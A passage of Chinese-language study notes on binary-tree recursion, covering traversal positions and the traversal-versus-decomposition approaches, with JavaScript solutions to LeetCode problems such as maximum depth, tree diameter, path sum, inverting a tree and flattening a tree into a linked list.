traverse = function(arr, i){\n    if (i == arr.length) {\n        return;\n    }\n    // 前序位置\n    traverse(arr, i + 1);\n    // 后序位置\n}\n// 迭代遍历：for循环 遍历链表\nvar traverse = function(head){\n    for (var p = head; p != null; p = p.next) {\n        // Code block to be executed\n    }\n}\n//  递归遍历： 遍历链表\nvar traverse = function(head){\n    if (head == null) {\n        return;\n    }\n    // 前序位置\n    traverse(head.next);\n    // 后序位置\n}\n```\n\n所以，有以下结论：\n\n1. 遍历有两种方式： `迭代遍历` 和 `递归遍历`\n2. `二叉树`这种结构无非就是`二叉链表`，没法通过`迭代遍历`\n3. `递归遍历`，有`前序` 和 `后序`两个位置\n\t1. 前序位置是`刚进入`节点时\n\t2. 后序则是`即将离开`节点时\n\n下图展示了一个`单链表`的遍历流程，`绿色`代表进入节点，即`前序`位置，`红色`代表 `后序` 位置。\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/b17bfdd9f0325628f085313c91a60ee3.png)\n\n 所以，如果想要 `倒序` 打印单链表，利用递归遍历单链表，并在后续位置`log`即可，其本质是利用递归的`堆栈`能力。如下代码：\n\n```javascript\n/* 递归遍历单链表，倒序打印链表元素 */\nvar traverse = function(head) {\n    if (head === null) {\n        return;\n    }\n    // 前序位置什么也不用做\n    traverse(head.next);\n    // 后序位置 打印\n    console.log(head.val);\n}\n```\n\n二叉树相比较于单链表，多了一个 `中序位置`，如下图：\n\n![image.png|569](https://832-1310531898.cos.ap-beijing.myqcloud.com/539bc2cd300873898adcd8866b2afc86.png)\n\n#### 3.4.1. 总结：`前中后序遍历二叉树`的`真正区别`是什么？\n\n1、`前序位置的代码` 在`刚刚进入`一个二叉树节点的时候执行；\n2、`后序位置的代码` 在`将要离开` 一个二叉树节点的时候执行；\n3、`中序位置的代码` 在 一个二叉树节点`左子树`都遍历完，`即将开始`遍历`其右子树的时候`执行。如下图：\n\n![image.png|540](https://832-1310531898.cos.ap-beijing.myqcloud.com/7a56cfda23861272bbd42db7b62424c5.png)\n\n通过上图可以发现，遍历`二叉树`的每个节点都有`「唯一」`属于自己的`前中后序位置`。而`多叉树`，没有`唯一的中序遍历位置`，所以不存在`多叉树中序遍历`（多叉树节点可能有很多子节点，会多次切换子树去遍历）\n\n最后， **二叉树的所有问题**，就是让你在`前中后序位置`注入巧妙的代码逻辑，去达到自己的目的，你只需要单独思考`每一个节点应该做什么`，其他的不用你管，抛给二叉树遍历框架，`递归`会在所有节点上做相同的操作\n\n> [!info]\n> 这就是**递归的意义**，**代码框架好了后，递归会帮你做，你的小脑袋瓜子别尝试去理解递归**，那是计算机的东西，你搞不过他。\n\n## 4. 二叉树的`两种解题思路`\n\n1. `遍历一遍二叉树`得出答案\n2. 通过`分解问题`计算出答案\n \n这两类思路分别对应着 `回溯算法核心框架` 和 `动态规划核心框架`。看如下解释：\n\n- 二叉树中用`遍历思路`解题时函数签名一般是 `void traverse(...)`，没有`返回值`，靠`更新外部变量`来计算结果；\n\t- 而`回溯算法核心框架` 中给出的函数签名一般也是 `没有返回值的 void backtrack(...)`\n- `分解问题思路`解题时`函数名`根据该函数具体功能而定\n\t- 而且一般会`有返回值`，返回值是`子问题的计算结果`； \n\t- 而 **动态规划**核心框架中给出的函数签名是`带有返回值的 dp 函数`\n\n## 5. 二叉树的最大深度\n\n- https://leetcode.cn/problems/maximum-depth-of-binary-tree/\n\n### 5.1. 思路 1：遍历一遍二叉树的思路\n\n即 `遍历`一遍二叉树\n\n- 用一个`外部变量 res`记录每个节点所在的深度\n- 变量`depth` 记录当前递归到的节点深度\n\n最后，取 `depth` 和 `res` 的最大值就可以得到最大深度，代码如下：\n\n```javascript\nvar maxDepth = function(root) {\n    let res = 0;\n    // depth 记录当前递归到的节点深度\n    let depth = 0;\n    function traverse(root) {\n        if(root === null) return;\n        depth++;\n        // 到达叶子节点\n        if(root.left === null && root.right === null){\n            res = Math.max(depth, res);\n        }\n        traverse(root.left);\n        traverse(root.right);\n        depth--;\n    }\n    traverse(root);\n    return res;\n};\n```\n\n> [!info]\n> 注意：函数命名和框架 `traverse` ，这种规范的好处是直接套用就行，主要精力放在具体逻辑上就好，架子的东西都是个人习惯，但要统一，不然给自己添加成本\n\n### 5.2. 思路 2：分解问题的思路\n\n即通过`子树的最大深度`推导出`原树的深度`，所以必然主要逻辑都在 `后序位置`，因为`后序位置`能够得到子树的深度。\n\n```javascript\nvar maxDepth = function (root) {\n    if (root == null) {\n        return 0;\n    }\n    // 利用定义，计算左右子树的最大深度\n    var leftMax = maxDepth(root.left);\n    var rightMax = maxDepth(root.right);\n    // 整棵树的最大深度等于左右子树的最大深度取最大值，\n    // 然后再加上根节点自己\n    var res = Math.max(leftMax, rightMax) + 1;\n    return res;\n};\n```\n\n## 6. 问：如何通过`前序遍历`打印是所有节点\n\n>  https://leetcode.cn/problems/binary-tree-preorder-traversal/\n\n同样需要借助外部变量 `res`，如下代码：\n\n```javascript\nvar res = [];\n\n// 返回前序遍历结果\nfunction preorderTraverse(root) {\n  traverse(root);\n  return res;\n}\n\n// 二叉树遍历函数\nfunction traverse(root) {\n  if (root === null) {\n    return;\n  }\n  // 前序位置\n  res.push(root.val);\n  traverse(root.left);\n  traverse(root.right);\n}\n```\n\n> 中序 和 后序 同理。上面代码的位置变一变即可\n\n## 7. 后序位置 与 前序位置 真正区别？\n\n位置很重要，比如你如何理解\n- `前序位置`的代码执行是`自顶向下`的，\n- 而`后序位置`的代码执行是`自底向上`，看下图：\n\n![image.png|416](https://832-1310531898.cos.ap-beijing.myqcloud.com/fb34de01e266744af7e0fe797fab28d0.png)\n\n意味着\n- `前序位置的代码`只能从函数参数中获取`父节点传递来的数据`，\n- 而`后序位置的代码`不仅可以获取`参数数据`，还可以获取到`子树通过函数返回值传递回来的数据`\n\n看两个例子：\n\n### 7.1. 如何打印出每一个节点所在的`层数` ？ \n\n> [!tip]\n> \n作为参数往下传递即可\n\n一个节点在第几层，你从根节点遍历过来的过程就能 `顺带记录`，用递归函数的`参数`就能传递下去，所以放在`前序位置和后续位置`都行，因为都可以通过递归函数作为参数传递。\n\n```javascript\n/**\n * @param {TreeNode} root\n * @param level 当前节点所在的层数\n * */\nfunction traverse(root, level) {\n    if (root == null) {\n        return;\n    }\n    console.log(`节点 ${root} 在第 ${level} 层`);\n    // 前序位置\n    traverse(root.left, level + 1);\n    traverse(root.right, level + 1);\n}\n\ntraverse(root, 1);\n```\n\n### 7.2. 如何打印出每个节点的`左右子树`各有多少节点？\n\n而以一个节点为根的整棵子树有多少个节点，你需要`遍历完子树之后`才能数清楚，然后通过`递归函数的返回值`拿到答案。所以必然需要放在 `后序位置`\n\n```javascript\nvar count = function(root) {\n    if (root === null) {\n        return 0;\n    }\n    var leftCount = count(root.left);\n    var rightCount = count(root.right);\n    // 后序位置\n    console.log(\"节点 \" + root + \" 的左子树有 \" + leftCount + \" 个节点，右子树有 \" + rightCount + \" 个节点\");\n\n    return leftCount + rightCount + 1;\n}\n```\n\n> [!info]\n> 一旦你发现题目和 **子树有关**，那大概率要给函数设置合理的定义和返回值，在`后序位置`写代码了。\n\n## 8. 二叉树的直径\n\n> https://leetcode.cn/problems/diameter-of-binary-tree/\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/0679936de5cd6009728269dde4e770b4.png)\n\n### 8.1. `直径` 与 `最长直径` 定义\n\n1. **找到最长路径**：从二叉树中的`任意一个节点`出发，找到连接到`另一个节点`的最长路径。这个路径可能会经过多个节点和边。\n2. **路径的长度**：最长路径上的`边的数量`就是二叉树的`最大直径`。注意，这个路径不一定需要经过根节点 \n\n解决这题的关键在于，`「直径」长度`，就是`一个节点的左右子树的最大深度之和`。\n\n> [!warning]\n> **仔细读这句话：每一条二叉树的「直径」长度，就是一个节点的左右子树的最大深度之和，然后就应该有解题思路了**\n\n**所以：算出每个节点的直径，然后再求直径的最大值即可。**\n\n所以，现在让我求整棵树中的`最长「直径」`，那直截了当的思路就是遍历整棵树中的每个节点，然后通过每个节点的左右子树的`最大深度`算出`每个节点的「直径」`，最后把所有「直径」求个最大值即可\n\n### 8.2. 不好的解法，复杂度较高，双重递归，`O(N^2)` \n\n>  ==可以先不用看了，这种解法==\n\n```javascript\nvar diameterOfBinaryTree = function (root) {\n    var maxDiameter = 0;\n    // 遍历二叉树\n    var traverse = function (node) {\n        if (node == null) {\n            return 0;\n        }\n        // ::::双重递归，复杂度比较高\n        // 对每个节点计算直径\n        var leftMax = maxDepth(node.left);\n        var rightMax = maxDepth(node.right);\n        var myDiameter = leftMax + rightMax;\n        // 更新全局最大直径\n        maxDiameter = Math.max(maxDiameter, myDiameter);\n        // 递归遍历左子树\n        traverse(node.left);\n        // 递归遍历右子树\n        traverse(node.right);\n    }\n    // 计算二叉树的最大深度\n    var maxDepth = function (node) {\n        if (node == null) {\n            return 0;\n        }\n        // 计算左右子树最大深度\n        var leftMax = maxDepth(node.left);\n        var rightMax = maxDepth(node.right);\n        return 1 + Math.max(leftMax, rightMax);\n    }\n    // 对每个节点计算直径，求最大直径\n    traverse(root);\n    return maxDiameter;\n}\n```\n\n### 8.3. 好的解法：复杂度 `O(N)` \n\n```javascript\nvar diameterOfBinaryTree = function(root) {\n    let maxDiameter = 0;\n    /**\n     * 递归获取深度\n     * @param {TreeNode} root \n     * @return {number}\n     */\n    const maxDepth = function(root) {\n        if (root === null) {\n            return 0;\n        }\n        let leftMax = maxDepth(root.left);\n        let rightMax = maxDepth(root.right);\n        // 后序位置，顺便计算最大直径\n        let myDiameter = leftMax + rightMax;\n        maxDiameter = Math.max(maxDiameter, myDiameter);\n        return 1 + Math.max(leftMax, rightMax);\n    }\n    maxDepth(root);\n    return maxDiameter;\n};\n```\n\n## 9. 层次遍历\n\n![image.png|426](https://832-1310531898.cos.ap-beijing.myqcloud.com/da632e5316aad761378cbb7739a2428b.png)\n\n如下图：\n![image.png|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/cb8b8145875d9afaae76a48fbd8e348d.png)\n\n### 9.1. 解法 1：前序遍历的思路\n\n```javascript\nvar levelTraverse = function(root) {\n    const res = [];\n    traverse(root, 0);\n    return res;\n    \n    // 遍历二叉树的每一层，将每层结点的值存储到 res 中\n    function traverse(root, depth) {\n        if (!root) {\n            return;\n        }\n        // 当前层数还未被存储过，则初始化对应层的数组\n        if (res.length <= depth) {\n            res.push([]);\n        }\n        // 将节点值存储到对应的层数中\n        res[depth].push(root.val);\n        // 递归遍历左右子节点\n        traverse(root.left, depth + 1);\n        traverse(root.right, depth + 1);\n    }\n};\n\n// 其实中序和前序都行\nvar levelOrder = function(root) {\n    const result = [];\n    const traverse = (node, layer) => {\n        if(node === null){\n            return;\n        }  \n        traverse(node.left, layer + 1);\n        /********** 中序位置 start ********** */ \n        if(result[layer]){\n            result[layer].push(node.val)\n        }else{\n            result[layer] = [node.val]\n        }\n        /************ 中序位置 end ********** */ \n        traverse(node.right, layer + 1);\n    }\n    traverse(root, 0);\n    return result;\n};\n```\n\n该解法，本质还是`二叉树的前序遍历`，或者说 `DFS` 的思路，而`不是层序遍历（或 BFS 思路）`， 因为这个解法是依赖`前序遍历自顶向下、自左向右`的顺序特点得到了正确的结果。\n\n抽象点说，这个解法更像是`从左到右的「列序遍历」`，而不是`自顶向下的「层序遍历」`\n\n### 9.2. 那么，层序遍历（或 BFS 思路）的解法呢？\n\n`BFS 算法框架` 就是从`二叉树的层序遍历`扩展出来的\n\n## 10. 最后，再总结二叉的解题思路\n\n综上，遇到一道二叉树的题目时的通用思考过程是：\n\n1、**是否可以通过 `遍历一遍` 二叉树得到答案？如果可以，用一个 `traverse` 函数配合外部变量来实现。这叫【`「遍历」的思路`】。**\n\n2、是否可以定义一个 `递归函数`，通过 `子问题（子树）`的答案推导出原问题的答案？如果可以，写出这个递归函数的定义，并充分利用这个`函数的返回值`。  【`分解问题的思路`】\n\n3、无论使用哪一种思维模式，你都要明白二叉树的每一个节点需要做什么，需要在什么时候（前中后序）做。`递归函数` 会帮你在所有节点上执行相同的操作，`你的小脑袋瓜子不用去尝试理解递归？`\n\n","2ndvaVXv":"\n# 二叉树的两种解题思维\n\n`#算法/二叉树` \n\n\n## 目录\n<!-- toc -->\n ## `两种` 二叉树解题思维模式 \n\n- **「遍历」的思维模式**\n- **「分解问题」的思维模式**\n\n二叉树解题的思维模式 `分两类`\n- **第一类：是否可以通过`遍历一遍`二叉树得到答案**？\n\t- 如果可以，用一个 `traverse` 函数配合`外部变量`来实现，这叫 `「遍历」的思维模式`。\n- **第二类：是否可以定义一个`递归函数`，通过`子问题（子树）的答案` 推导出 `原问题的答案`？\n\t- 如果可以，写出这个递归函数的定义，并充分利用这个`函数的返回值`，这叫`「分解问题」的思维模式`。\n\n无论使用哪种`思维模式`，你都需要思考：\n\n**如果单独抽出`一个二叉树节点`，**\n- **它需要`做什么`事情？**\n- **需要在`什么时候（前/中/后序位置）做`？或者说 `在哪个位置做？`\n\n其他的节点不用你操心，`递归函数`会帮你在所有节点上执行相同的操作。\n\n>  一定要`相信`这个`递归函数`\n> 并且千万`不要陷入`递归函数\n\n## 应用：求二叉树的最大深度\n\n>  https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/8c7640b48c2ea0df269540208beb58e9.png)\n\n### 分析\n\n![image.png|744](https://832-1310531898.cos.ap-beijing.myqcloud.com/69f0e33219ff2fb885298f5dc6ec9591.png)\n\n> 二叉树题目的递归解法可以分`两类思路`\n> - 第一类：遍历一遍二叉树得出答案\n> - 第二类：通过分解问题计算出答案\n 这两类思路分别对应着 `回溯算法核心框架` 和 `动态规划核心框架`。\n\n### `二叉树最大深度`的两种思路\n\n- `遍历`的思路\n\t- 它是 `回溯算法`的`祖宗`\n- `分解问题`的思路\n\t- 它是 `动态规划` 和 `分治算法` 的 `祖宗`\n\t- 分解成 `规模更小，结构相同` 的子问题\n\n### 解法一：`遍历一遍二叉树`的思路\n\n```javascript\n/**\n * :::: 解法一：遍历一遍二叉树\n * @param {TreeNode} root\n * @return {number}\n * https://leetcode.cn/problems/maximum-depth-of-binary-tree/\n */\nvar maxDepth = function (root) {\n    let res = 0;\n\n    // ::::需要正确的维护深度，即前序遍历++ 后序遍历--\n    let depth = 0;\n\n    function traverse(root) {\n        // ::::base case\n        if (root === null) return res;\n        // ::::前序位置\n        depth++;\n\n        // ::::如果到达叶子节点，更新res\n        if (root.left === null && root.right === null) {\n            res = Math.max(res, depth);\n        }\n\n        traverse(root.left);\n        // :::::中序位置\n        traverse(root.right);\n        // ::::后序位置\n        depth--;\n    }\n\n    traverse(root);\n\n    return res;\n};\n\n```\n\n> - `traverse` 理解成在二叉树上游走的一个`指针`，所以当然要这样维护 `depth`\n> -  `res` 的更新，前后中序都行\n\n### 解法二：`分解问题为左右子树` 的思路\n\n```javascript\n/**\n * :::: 解法二：分解问题的思路\n * @param {TreeNode} root\n * @return {number}\n * @url https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/\n */\nvar maxDepth = function (root) {\n    // ::::base case\n    if (root === null) return 0;\n\n    // ::::前序位置\n    \n    // ::::分解问题, 分别求左右子树的最大深度\n    const left = maxDepth(root.left);\n    \n    // ::::中序位置\n    const right = maxDepth(root.right);\n\n    // ::::后序位置，合并结果，为什么要在后序位置合并结果呢？\n    // ::::因为要先解决子问题，即计算出左右子树的最大深度，才能推导出父类的最大深度\n    \n    // ::::合并结果\n    return Math.max(left, right) + 1;\n\n};\n\n```\n\n> 问：**为什么主要的代码逻辑集中在后序位置？**\n> - 见代码注释\n\n## 应用：[路径总和](https://leetcode.cn/problems/path-sum/)\n\n![image.png|608](https://832-1310531898.cos.ap-beijing.myqcloud.com/20ba40f7bf10bc1a3d8b33b3b69096ba.png)\n\n### 解法一：`遍历一遍二叉树` 的思路\n\n```javascript hl:13,24\n/**\n * @param {TreeNode} root\n * @param {number} targetSum\n * @return {boolean}\n */\nvar hasPathSum = function (root, targetSum) {\n    let hasSum = false;\n    let sum = 0;\n    function traverse(root) {\n        // ::::base case\n        if (root === null) return;\n        // ::::前序位置\n        sum += root.val;\n        // ::::如果到达叶子节点，判断是否满足条件\n        if (root.left === null && root.right === null) {\n            if (sum === targetSum) {\n                hasSum = true;\n            }\n        }\n        traverse(root.left);\n        // ::::中序位置\n        traverse(root.right);\n        // ::::后序位置\n        sum -= root.val;\n    }\n    traverse(root);\n    return hasSum;\n};\n```\n\n> - **这里可以优化，只要找到了，存在了，就没必要继续遍历了**\n> - **需要在 `前序和后续位置` 维护 `sum 变量`\n\n### 解法二：`分解问题`的思路\n\n```javascript\n/**\n * @url https://leetcode.cn/problems/path-sum/description/\n * */\n/**\n * @description 路径总和,分解成左右子树的问题\n * @param {TreeNode} root\n * @param {number} targetSum\n * @return {boolean}\n */\nvar hasPathSum = function(root, targetSum) {\n  \n    // ::::base case\n    if (root === null) return false;\n\n    // ::::前序位置\n\n    // ::::如果到达叶子节点，判断是否满足条件\n    // ::::都到达叶子节点了，说明没有左右子树了，这时候只需要判断当前节点的值是否等于 targetSum 即可\n    if (root.left === null && root.right === null) {\n        return targetSum === root.val;\n    }\n\n    // ::::分解问题, 分别求左右子树中是否存在路径和为 targetSum - root.val\n    const hasPathInleft = hasPathSum(root.left, targetSum - root.val);\n\n    // ::::中序位置\n    const hasPathInRight = hasPathSum(root.right, targetSum - root.val);\n\n    // ::::后序位置\n    // ::::？？？为什么要在后序位置合并结果呢？\n    return hasPathInleft || hasPathInRight;\n\n};\n```\n\n## 应用：[翻转二叉树](https://leetcode.cn/problems/invert-binary-tree/)\n\n![image.png|448](https://832-1310531898.cos.ap-beijing.myqcloud.com/d23419bb3d074a766ea9cffa8c0f4e3f.png)\n\n### 解法一：通过 `遍历一遍二叉树` 的思路\n\n```javascript\n/**\n * @description 翻转二叉树,遍历一遍二叉树的解决方案\n * @param {TreeNode} root\n * @return {TreeNode}\n */\n// ::::::解法一：通过遍历一遍二叉树得到结果\nvar invertTree = function(root) {\n\n    function traverse(root) {\n        // ::::base case\n        if(root === null){\n            return;\n        }\n\n        // ::::交换左右子树\n        // ::::问：为什么在前序位置处理逻辑呢？\n        const temp = root.left;\n        root.left= root.right;\n        root.right = temp;\n\n        // ::::前序位置\n        traverse(root.left);\n        // :::: 中序位置\n        traverse(root.right);\n        // ::::后序位置\n      \n    }\n\n    traverse(root);\n\n    // ::::原地修改\n    return root;\n};\n```\n\n> **可使用 `前序遍历`、`后序遍历`、及`层次遍历`，但不能使用`中序遍历`\n> 为什么不能使用 `中序遍历` 如下解释：\n> ![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/3bf5a8adcc0e81f14aedb6f7a739e7d7.png)\n\n### 解法二：使用`分解问题`的思路\n\n```javascript\n// ::::分解问题的思路\n/**\n * @param {TreeNode} root\n * @return {TreeNode}\n */\nvar invertTree = function(root) {\n    // ::::base case 这是递归的基本情况，也是递归结束的标志\n    // 基本情况：如果当前节点为空，直接返回null\n    if (root === null) {\n        return null;\n    }\n\n    // ::::前序位置\n    // :::: 对于非空节点，我们递归地调用invertTree函数来翻转当前节点的左子树和右子树。\n    // :::: 这里的关键在于，我们先保存左子树翻转的结果，再翻转右子树，然后将两者交换。\n    //  :::: 即使用 left 和 right 来个变量来保存左右子树的翻转结果\n    // :::: 这样做是因为在递归调用过程中，原来的左右子树已经被修改，所以需要先保存它们的结果\n    // 分解问题：递归地翻转左子树和右子树\n    let left = invertTree(root.left);\n    let right = invertTree(root.right);\n    // ::::后序位置\n    // 将翻转后的左子树和右子树交换\n    root.left = right;\n    root.right = left;\n\n    // 返回翻转后的根节点\n    return root;\n};\n\n```\n\n> **问：为什么在`后序位置` 处理主要逻辑？**\n>  很明显，这个时候才能拿到 翻转过的 `left` 和 `right` 啊\n\n## 应用：[填充每个二叉树节点的右侧指针](https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/)\n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/d5ad2f66b91921359fa95b8d226a00eb.png)\n\n输入是一棵`「完美二叉树」`，形象地说整棵二叉树是一个`正三角形`\n- 除了最右侧的节点 `next` 指针会指向 `null`\n- 其他`节点的右侧一定有相邻的节点`\n\n### 解法一：遍历的思路\n\n```javascript\n// 二叉树遍历函数\nvoid traverse(Node root) {\n    if (root == null || root.left == null) {\n        return;\n    }\n    // 把左子节点的 next 指针指向右子节点\n    root.left.next = root.right;\n\n    traverse(root.left);\n    traverse(root.right);\n}\n```\n\n上面代码有问题，`5`和`6`不属于同一节点，没法串起来。\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/8d10dc15362c00d63a1b87ba8969255c.png)\n\n所以，我们得想想如何遍历`两个相邻节点之间的空隙`\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/c7ea4a0fd89fa43e12f1878a18ad9e5e.png)\n\n**这样，一棵二叉树被抽象成了一棵`三叉树`，三叉树上的每个节点就是原先二叉树的两个相邻节点。**\n\n```javascript\n/**\n * @param {Node} root\n * @return {Node}\n */\nvar connect = function(root) {\n    if(root === null){\n        return null;\n    }\n    // 遍历「三叉树」，连接相邻节点\n    traverse(root.left,root.right);\n    return root;\n};\n\n\n// 三叉树遍历框架\nfunction traverse(node1,  node2) {\n    if (node1 == null || node2 == null) {\n        return;\n    }\n    /**** 前序位置 ****/\n    // 将传入的两个节点穿起来\n    node1.next = node2;\n    // 连接相同父节点的两个子节点\n    traverse(node1.left, node1.right);\n    traverse(node2.left, node2.right);\n    // 连接跨越父节点的两个子节点\n    traverse(node1.right, node2.left);\n}\n```\n\n> - **传入多少个参数，很重要，同步重要，比如和上面的传入的两个参数**\n> - **拿出一个点来，自己画画，分析下就好了**\n\n### 分解问题思路，没好的思路\n\n省略\n\n## 应用： [将二叉树展开为链表](https://leetcode.cn/problems/flatten-binary-tree-to-linked-list/)\n\n![image.png|648](https://832-1310531898.cos.ap-beijing.myqcloud.com/7173c4ca18906da80f71299de85bac69.png)\n\n### 遍历的思路\n\n省略\n\n### 分解问题\n\n对于一个节点 `x`，可以执行以下流程：\n- 先利用 `flatten(x.left)` 和 `flatten(x.right) `将 **x  的左右子树拉平**。\n- 后序遍历位置，将 `x` 的 **右子树接到左子树下方，然后将整个左子树作为右子树。**\n\n![image.png|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/9f211d026e1ed173ce64531c3c1bb4fa.png)\n\n递归的魅力就在于，不容易说清楚，也别尝试完全理解它，差不多就行了，但只是让每个节点做他应该做的事情，然后就搞定了。\n\n```javascript\n\n/**\n * @param {TreeNode} root\n * @return {void} Do not return anything, modify root in-place instead.\n */\nvar flatten = function(root) {\n    // base case\n    // 因为是原点操作，return就好\n    if(root === null){\n        return;\n    }\n\n    // 利用定义，把左右子树拉平\n    flatten(root.left);\n    flatten(root.right);\n\n    /**** 后序遍历位置 ****/\n    // 1、这时，左右子树已经被拉平成一条链表，先保存这时候的左右子树状态\n    let left = root.left;\n    let right = root.right;\n\n\n    // 2、将左子树作为右子树\n    root.left = null;\n    root.right = left;\n\n\n    // 3、将原先的右子树接到当前右子树的末端\n    // (1) 先要遍历已有right节点，同链表\n    // (2) 将最早保存的right节点指到最后\n    let p = root;\n    while (p.right != null) {\n        p = p.right;\n    }\n    p.right = right;\n};\n```\n\n### 总结\n\n- **二叉树问题的`两种思维模式`\n    - **「遍历」的思维模式\t\n    - **「分解问题」的思维模式**\n    - **无论哪种模式，都需要思考对`每个节点需要做什么`，`在哪做（前中序）`\n- **两种思维模式，对应着`两种框架`\n    - **回溯算法框架**\n    - **动态规划&分治问题框架**\n- 一定要`相信`这个`递归函数`，不要陷入`递归函数`\n\n","RDhnK5Lx":"\n# 二叉树的分解问题思路\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结要点 \n\n- `原问题`能不能分解为 `规模更小，结构相同` 的`子问题`\n\t- `如果能`，就可以通过子问题的答案`合并出`原问题的答案\n- 一定要`明确`递归函数的定义，并且需要`相信` 这个递归函数\n\t- `base case` 的`两个`主要判断依据，即`递归结束的条件`\n\t\t- ① 是不是空节点了，即 `root === null`\n\t\t- ② 是否到达了`叶子节点` , 即 `root.left === null && root.right === null`\n\t\t- ③ 其他：根据题目情况而定\n- 这里有不少题，不是二叉树，但这里旨在说明 `递归`的重要性\n\n## 2. [相同的树](https://leetcode.cn/problems/same-tree/)\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/6bf68f208bf310637368597563ebcc3b.png)\n\n### 2.1. ① 明确`递归函数`的定义，并相信它\n\n```javascript\n/**\n * @description 判断两个二叉树是否相同\n * @param {TreeNode} p\n * @param {TreeNode} q\n * @return {boolean}\n */\n// :::第一步：定义：输入两棵树p、q，返回一个布尔值，表示两棵树是否相同\nvar isSameTree = function(p, q) {\n\n};\n```\n\n### 2.2. ② `base case`, 递归`结束`的条件\n\n```javascript\n// ::::定义：输入两棵树p、q，返回一个布尔值，表示两棵树是否相同\nvar isSameTree = function(p, q) {\n\n    // ::::第二步：base case, 递归结束的条件\n    \n    //:::: ① 条件一：两个节点都为空，返回true，说明两个节点相同\n    if(p === null && q === null){\n        return true;\n    }\n  \n    // :::: ② 条件二：两个节点中有一个为空，一个不为空，返回false，说明两个节点不相同\n    if(p === null || q === null){\n        return false;\n    }\n  \n    // :::: ③ 条件三：两个节点都不为空，但是值不相等，返回false，说明两个节点不相同\n    if(p.val !== q.val){\n        return false;\n    }\n\n};\n```\n\n### 2.3. ③ `递归调用左右子树`\n\n```javascript\n/**\n * @description 判断两个二叉树是否相同\n * @param {TreeNode} p\n * @param {TreeNode} q\n * @return {boolean}\n */\n// ::::第一步：定义：输入两棵树p、q，返回一个布尔值，表示两棵树是否相同\nvar isSameTree = function(p, q) {\n\n    // ::::第二步：base case, 递归结束的条件\n\n    //:::: ① 条件一：两个节点都为空，返回true，说明两个节点相同\n    if(p === null && q === null){\n        return true;\n    }\n    // :::: ② 条件二：两个节点中有一个为空，一个不为空，返回false，说明两个节点不相同\n    if(p === null || q === null){\n        return false;\n    }\n    // :::: ③ 条件三：两个节点都不为空，但是值不相等，返回false，说明两个节点不相同\n    if(p.val !== q.val){\n        return false;\n    }\n\n    // ::::::第三步：递归调用左右子树\n    const isLeftSame = isSameTree(p.left, q.left);\n    const isRightSame = isSameTree(p.right, q.right);\n\n    return isLeftSame && isRightSame;\n\n};\n\n```\n\n## 3. [二叉树展开为链表](https://leetcode.cn/problems/flatten-binary-tree-to-linked-list/)\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/e55b358cec4b6a48d15733aa36aa8e4b.png)\n\n### 3.1. ① 明确递归函数的定义，并相信它\n```javascript\n/**\n * @param {TreeNode} root\n * @return {void} Do not return anything, modify root in-place instead.\n */\n// ::::第一步：定义：输入一个二叉树，返回一个链表，它会打平\nvar flatten = function(root) {\n\n};\n```\n\n- 如下图 ① 位置\n    - `root` 传值给 `flatten 函数`，就会变成 下图`中间位置`那样\n      - 至于，怎么变的，我不知道，但我相信这个`flatten 函数`\n- 如下图 ② 位置：给子树调用完后  `flatten 函数`，需要处理 `单链表 指向逻辑`\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/9e912e9449c3657000deea5287fce9ab.png)\n\n### 3.2. ② 明确 `base case` , 即 `递归结束条件`\n\n```javascript\n// ::::第一步：定义：输入一个二叉树，返回一个链表，它会打平\nvar flatten = function(root) {\n    // ::::第二步：base case, 递归结束的条件\n    if(root === null){\n        return;\n    }\n    // ....\n};\n```\n\n### 3.3. ③ 递归调用左右子树\n```javascript\n/**\n * @param {TreeNode} root\n * @return {void} Do not return anything, modify root in-place instead.\n */\n// ::::第一步：定义：输入一个二叉树，返回一个链表，它会打平\nvar flatten = function(root) {\n    // ::::第二步：base case, 递归结束的条件\n    if(root === null){\n        return;\n    }\n    // ::::第三步：递归调用左右子树\n\n    // ::::左子树已经被拉平成一条链表\n    flatten(root.left);\n    // :::: 让左子树指向变量 left，为了后面操作左右子树的指向，方便操作单链表\n    let left = root.left;\n\n    // ::::右子树已经被拉平成一条链表\n    flatten(root.right);\n    // :::: 让右子树指向变量 right，为了后面操作左右子树的指向，方便操作单链表\n    let right = root.right;\n\n};\n```\n\n### 3.4. ④ 处理单链表指向问题\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/6644c7acbf1211721e98e3fd8fe88b58.png)\n\n```javascript\n\n/**\n * @param {TreeNode} root\n * @return {void} Do not return anything, modify root in-place instead.\n */\n// ::::第一步：定义：输入一个二叉树，返回一个链表，它会打平\nvar flatten = function (root) {\n    \n    // ::::第二步：base case, 递归结束的条件\n    if (root === null) {\n        return;\n    }\n    // ::::第三步：递归调用左右子树\n\n    // ::::左子树已经被拉平成一条链表\n    flatten(root.left);\n    // :::: 让左子树指向变量 left，为了后面操作左右子树的指向，方便操作单链表\n    let left = root.left;\n\n    // ::::右子树已经被拉平成一条链表\n    flatten(root.right);\n    // :::: 让右子树指向变量 right，为了后面操作左右子树的指向，方便操作单链表\n    let right = root.right;\n\n    /*************************************************\n     * ::::处理单链表指向问题\n     ************************************************/\n    // ::::: ① 让左子树为空，右子树指向左子树\n    root.left = null;\n    root.right = left;\n\n    // :::: ② 指针指向 p,一直前进，直到\n    let p = root;\n    while (p.right !== null) {\n        p = p.right;\n    }\n\n    // :::: ③ 让右子树指向变量 right\n    p.right = right;\n\n};\n\n```\n\n**三个重点：**\n- ①  相信这个 打平函数\n- ②  调用`左右子树`后需要使用变量 `left` 和 `right` 去接受，方便后面处理单链表指向问题\n- ③  具体处理单链表指向问题，参考上图\n\n## 4. 附：刷题时的一个 `约定`\n\n> 一个技巧：\n> - **所有变量定义尽量都使用 `let` 省得后面还得改成 